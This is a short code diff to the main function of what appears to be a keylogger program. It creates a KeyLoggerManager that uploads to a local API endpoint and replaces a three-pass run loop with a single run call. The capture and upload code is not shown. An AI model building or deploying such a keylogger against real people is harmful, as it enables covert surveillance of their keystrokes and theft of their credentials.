@@ -6,8 +6,8 @@ def main():
     program = manager.KeyLoggerManager(5, "woodrow", "http://127.0.0.1:5000/api/upload", True)
     
     program.start()
-    for i in range(3):  
-        program.run()
+      
+    program.run()
 
     program.stop()
         
